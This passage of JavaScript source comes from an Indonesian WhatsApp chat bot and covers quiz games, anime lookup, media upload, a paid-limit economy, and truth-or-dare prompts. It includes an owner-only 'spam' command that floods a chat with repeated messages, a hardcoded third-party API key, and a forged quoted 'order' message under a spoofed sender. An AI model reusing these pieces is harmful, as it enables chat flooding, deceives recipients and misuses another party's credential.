                      const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                      let anal = randKey.result.answer.toLowerCase()
                      game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
                      gameAdd(senderNumber, user)
                        }
                      break 
           
           case 'siapaaku': case 'siapakahaku': case 'sa':{
                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                     if (!isGroup) return setReply(mess.only.group)
                     if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/siapaaku.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                     setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
                     let anau = randKey.data.jawaban.toLowerCase()
                     game.addsyiko(from, anau, gamewaktu, siapaaku)
                     gameAdd(senderNumber, user)
                      }
                     break
           
           
           case 'tebakanime2':
try{
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (!isGroup) return setReply("Hanya bisa di group")
                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    setReply(mess.wait)
                    pin = await hx.pinterest(karakter)
                    ac = pin[Math.floor(Math.random() * pin.length)]
            
            
                    penunjuk = karakter.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, ac, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${penunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
                    asi = karakter.toLowerCase()
                    game.addanime(from, asi, gamewaktu, tebakanime)
            
            

               } catch (err){
					
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, randKey.hasil.image, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
                    nurulsayank = randKey.hasil.nama.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)              
		            }
					gameAdd(senderNumber, user)
            break
           
           
           
           
           
           
           
           case 'tebakanime': case 'ta':{
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (!isGroup) return setReply("Hanya bisa di group")
                    setReply(mess.wait)
                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    const petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, randKey.hasil.image,`Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`,  dev)
                    let nurulsayank = randKey.hasil.nama.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)
                    gameAdd(senderNumber, user)
                    }
                    break
           
           
           
           
           
           
          
           
           case 'math':{
                       if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                       if (!isGroup) return setReply(mess.only.group)
                       if (game.isMtk(from, mtk)) return setReply(`Masih ada soal yang belum di selesaikan`)
                       if (!q) return setReply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
                        anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}&apikey=GSdohIiH`)
                       setReply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}detik`)
                       let anih = anu.data.jawaban.toLowerCase()
                       game.addmtk(from, anih, gamewaktu, mtk)
                       gameAdd(senderNumber, user)
                       }
                       break
           
           
           case 'tebakkata': case 'tk':{
                   if (!isGroup) return setReply(mess.only.group)
                   if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                   if (game.isTebakKata(from, tebakkata)) return setReply(`Masih ada soal yang belum di selesaikan`)          
                   data = fs.readFileSync('./lib/game/tebakkata.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                   
                   setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.acak}\n\nTipe: ${randKey.result.tipe}\n\nWaktu : ${gamewaktu} detik`)
                   let ahhh = randKey.result.jawaban.toLowerCase()
                   game.addkata(from, ahhh, gamewaktu, tebakkata)
                   gameAdd(senderNumber, user)
                    }
                   break
           
           
           

        
      case 'wait': case 'whatanime':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                const FormData = require('form-data')
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(yoooo)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    sendFileFromUrl(res.result[0].video, video, {quoted: dev, caption: teks})
                    limitAdd(senderNumber, user)
                    })    
                 .catch((err) => {                   
                   setReply(mess.error.api)
                    })
                    } else if (isSticker || isQuotedSticker ) {
                    let encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
                    let ran = getRandom('.png')
				  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
			        fs.unlinkSync(yoooo)
			    	if (err) return setReply('Gagal :V')   
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(ran)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    xdev.sendFileFromUrl(from, res.result[0].video, teks, msg)
                    limitAdd(senderNumber, user)
                    fs.unlinkSync(ran)
                    })
                 .catch((err) => {       
                            setReply(mess.error.api)
                        })
               })
                 } else {
                   setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
                }
               }
               break
        
      

        
        case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									
									if (isQuotedAudio) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
										Okelor = await uploadFile1Day(delib)
										teks=`]─ 「 *AUDIO TO URL* 」 ─[

Url : ${Okelor}`
										setReply(teks)
 
										} else if (isQuotedImage) {
											
											setReply(mess.wait)
											bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
											qbc = await upload(delib)
											teks=`─ 「 *IMAGE TO URL* 」 ─

Url : ${qbc}`
											setReply(teks)
											} else if (isQuotedVideo) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
ffff = await uploadFile1Day(delib)
												teks=`]─ 「 *VIDEO TO URL* 」 ─[

Url : ${ffff}`
												setReply(teks)
												} else if (isQuotedSticker) {
													
													setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
													
													vrr = await uploadFile1Day(delib)
													teks=`]─ 「 *STICKER TO URL* 」 ─[

Url : ${vrr}`
													setReply(teks)
												}
											break
											
											
											
											
											
											
											
											
        
        
        
        
        case 'setbio':
        case 'setbiobot':
                                     {
									 if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
									if (args.length < 1) return setReply(`Kirim perintah ${command} nama\n\nContoh : ${command} Paijo`)
									autobio = false
									await xdev.setStatus(q)
									.then((res) => setReply(`Berhasil mengganti status bio ke ${q}`))
									.catch((err) => setReply('waduh error'))
									}
									break
        
        
        
        
        
        
           
           case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					xdev.sendMessage(from, cek, text, { quoted: dev })
					break
					
					
					
					case 'truth':
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					setReply(`${ttrth}`) 
					break
			case 'dare':
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					setReply(`${der}`) 
					break
	     
//******************** 》Limit《 ********************\\
       case 'topbalance':
                      if(!isGroup)return setReply(mess.only.group)
                      xdev.updatePresence(from, Presence.composing)
                      let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
                      let mebn = [];
                      for (let i of user){
                      mebn.push(i.id)
                      let bl = (i.balance)
                      txot += `*ID :* @${i.id}\n➸ Saldo : ${bl}\n\n`
                      }
                      mentions(txot, mebn, true)
                      break
            case 'limit':
            case 'ceklimit': 
            case 'balance': 
            case 'glimit':
                      setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}\nLimit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}\nSaldo : Rp ${getBalance(senderNumber, user)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                      break
            case 'buylimit':{
                       if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
                       if (q.includes('-')) return setReply(`Jangan menggunakan -`)
                       if (isNaN(q)) return setReply(`Harus berupa angka`)
                       let ane = Number(math(q) * 100)
                       if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
                       kurangBalance(senderNumber, ane, user)
                       giveLimit(senderNumber, math(q), user)
                       setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber, limitCount, user)}/${limitCount}`)
                       }
                       break
    
  case 'buypremium':
  case 'buyprem':
  try{
  if (!q) return setReply(`Kirim perintah *${prefix}buyprem jumlah* \n\nHarga 1 Jam premium = Rp50,000`)
  if (isNaN(q)) return setReply(`Harus berupa angka`)
 ane = Number(math(q) * 50000)
 if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
 kurangBalance(senderNumber, ane, user)
 teks =`${q}h`
_prem.addPremiumUser (sender, teks, premium)         
await setReply(`Sukses add premium`)
await sendButMessage(from, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium selama 1 jam\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
 } catch (err){
 setReply(`${err}`)
 }
	break


          
           
           case 'buyglimit':
           case 'buygamelimit':
                       {
                       if(!q)return setReply(`Example : ${prefix + command} 10\n\nHarga 1 limit = Rp750`)
                       const koinPerlimit = 750
                       const total = koinPerlimit * q
                       if (getBalance(senderNumber, user) <= total) return setReply(`Maaf Saldo kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                       kurangBalance(senderNumber, total, user)
                       givegame(senderNumber, math(q), user)
                       setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp${getBalance(senderNumber, user).toLocaleString()}\nSisa Game Limit : ${cekGLimit(senderNumber, gcount, user)}/${gcount}`)
                       }
                       break
          case 'giftlimit':
                       if(!isOwner)return
                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
                       lim = q.split(" ")[1]
                       const tag1 = `${q.split(" ")[0].replace("@",'')}`
                       giveLimit(tag1, lim, user)
                       setReply('Succes')
                       break
           
           
           
           
          
                  
            




      
          
        case 'listprem':
        case 'listpremium':

                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
                   let men = [];
                   for (let i of premium){
                   men.push(i.id)
                   let cekvip = ms(i.expired - Date.now())
                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
                   }
                   setReply(txt, men, true)
                   break
                   
                   case 'emoji':
                      if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                      if (args.length == 0) return setReply(`Example: ${prefix + command} wa 🗿

*LIST EMOJI*

code: ap
vendor: Apple
      
code: go
vendor: Google
      
code: sa
vendor: Samsung
      
code: ms
vendor: Microsoft
      
code: wa
vendor: WhatsApp
      
code: tw
vendor: Twitter
      
code: fb
vendor: Facebook
      
code: jp
vendor: JoyPixels
     
code: op
vendor: OpenMoji
      
code: od
vendor: emojidex
      
code: mes
vendor: Messenger
      
code: lg
vendor: logitech
    
code: htc
vendor: HTC
      
code: mo
vendor: Mozilla
      
code: sb
vendor: SoftBank
      
code: dm
vendor: Docomo
      
code: au
vendor: auKDDI

penggunaan : ${prefix + command } wa 🗿`)
                     emojis = args[0]
                     args.shift()
                     emoje = args.join(" ")
                     setReply(mess.wait)
                     limitAdd(senderNumber, user)
                     switch (emojis) {
               case 'ap':
               case 'apple':
			             emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[0].url}`
    	         		sendStickerUrl(from,`${teks}`)	
             			console.log(teks)
   	  	     		})
                        break
              case 'go':
              case 'google':
                     emoji.get(`${emoje}`).then( emoji => {
				     teks = `${emoji.images[1].url}`
    	   	  	sendStickerUrl(from,`${teks}`)	
    	   	  	console.log(teks)
   			  	})
                     break
              case 'sa':
            case 'samsung':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[2].url}`
       	 		sendStickerUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
            case 'ms':
            case 'microsoft':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[3].url}`
       	 		sendStickerUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
              case 'wa':
              case 'whatsapp':
                         emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[4].url}`
      	       		sendStickerUrl(from,`${teks}`)	
    		         	console.log(teks)
   		     	 	})
                         break
                         
               case 'tw':
                  emoji.get(`${emoje}`).then(emoji => {
				  teks = `${emoji.images[5].url}`
    	  		sendStickerUrl(from,`${teks}`)	
      			console.log(teks)
   				})
                  break
                  
              case 'fb':
              case 'facebook':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[6].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'jp':
              case 'joypixel':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[7].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'om':
              case 'openmoji':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[8].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'od':
              case 'emojidex':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[9].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'mes':
              case 'messenger':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[10].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'lg':
              case 'logitech':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[11].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
             case 'htc':
              
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[12].url}`
          	  		sendStickerUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
                        
                        
              
           case 'mo':
           case 'mozila':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[13].url}`
    			     sendStickerUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
             
             case 'sb':
           case 'softbank':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[14].url}`
    			     sendStickerUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
           case 'dm':
           case 'docomo':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[15].url}`
    			     sendStickerUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
          case 'au':
           case 'aukddi':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[16].url}`
    			     sendStickerUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break            
                   }
                   break
                   
                 


  
                   
                   
           case 'claim':   
           case 'klaim':
              if (checkClaim(senderNumber, _claim)) return setReply(mess.claimOn)
                    var htgm6 = randomNomor(2500)
                    var htgm7 = randomNomor(20)
                    addBalance(senderNumber, htgm6, user)
                    giveLimit(sender, htgm7, user)
                    addUserClaim("1d", timeWib, pushname, senderNumber, _claim)
                    await setReply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & Uang Rp *${htgm6}* 
Dari claim harian`)
                    break
			
			
			
			
			
			
			
			
                   
                   
                   
                   
                   
        case 'cekprem': case 'cekpremium':
                   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
                   try {
                   ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                   } catch {
                   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                   }
                   teks = `❒ *「 Premium User 」* ❒ 
  
 *Nama : ${pushname}*
 *Tag : @${sender.split("@")[0]}*
 *Expired : ${premiumnya}*`
                    its = await getBuffer (ppimg)
                    xdev.sendMessage(from, its, image, {contextInfo: forward, caption: teks
                     })
                     break
                     
                     
           
           
           
           
           
           
case 'me': 
case 'profile':
case 'myprofile':
try {
ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await xdev.getStatus(`${sender.split('@')[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
hituser = gethitUser(senderNumber, user)
persenya =`${userPersen}`
nana =`${userExp}/${requiredExp}`
if(isOwner){
	 prmm = isPremium ? `Unlimited`:'Not Premium'
	} else {
      prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
 }
 
teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
💳 Saldo  : Rp ${getBalance(senderNumber, user).toLocaleString()}
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium':'Free'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner':'User'}
🕔 Expired : ${prmm}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
📈 Limit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`


its = await getBuffer (ppimg)

butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];         
buttonMessage = {
contentText: teks,
footerText: copyright,
buttons: butprofile,
headerType: 1,
}
xdev.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : `${getBalance(senderNumber, user)}`, status: 1,surface : 2,message: `${pushname}\n${stst}`,orderTitle: `${stst}`,thumbnail: its, sellerJid: `0@s.whatsapp.net`}}}})
break 
           
           
           
           
           
           
           

           

           
           
           
           
           
           
           
          
           
           
           
           
           case 'tekschat':
           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
           teksChat = `${q}`
           setReply(`
Berhasil mengganti teksChat Bot
jika ada yang command ke bot maka bot
akan menjawab : ${q}`)
       break    
           
           
           
    
    
      
      
           
           
        
                 
              
                 
                
            case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                setReply(bi)
                break
            
           
					
					
					
           
           
          

           
           
           



 
 
 
           
           
           
           
           
           
					
					
					
					
           case 'kbbi':
					if (args.length < 1) return setReply('Apa yang mau dicari um?')
					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					setReply('Menurut Kbbi:\n\n'+asw.result)
					break
           
           
           
                
           
           
           
           
           
          
           
           
           


   
           
        
   
           
           
           

           case "astetick":
    case "videoanime":
    case "storyanime":
    setReply(mess.wait)
     Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
     xdev.sendMessage(from, Iki, video, {quoted: dev })
     break
           
           
           
           
           
           
           
           
           case 'spam':
				if (!isOwner && !dev.key.fromMe) return setReply(mess.only.ownerB)
					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return setReply('Kebanyakan!')
				if (isNaN(argzi[1])) return setReply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					xdev.sendMessage(from, argzi[0], MessageType.text)
				}
				break
         
           
           
           
     
    

      
           
           
                    
                    
           
           
           
           
case 'kodebahasa':
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
break
           
           
       
           
         
        
           
           


           
           
           
           
           
           
           
           
           
           
           
     
           
           
           
           
           
           
           
           
           
           
           
case 'translate': case 'tr':
try {
if (args.length < 1)return setReply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
if (args.length > 1) {
translate(`${body.slice(10+args[0].length+1)}`, args[0])
.then((res) => { setReply(`${res}`) })
} else if(dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation) {
tolang = args[0]
entah = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
translate(entah, tolang)
.then((res) => { setReply(`${res}`) })
}
} catch (e) {
setReply(`${e}`)
}
break
           
           
           
           
           
           
           
           
           
           
         
           
           
                   
           
           
case 'wiki':
case 'wikipedia':
if (args.length < 1) return setReply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
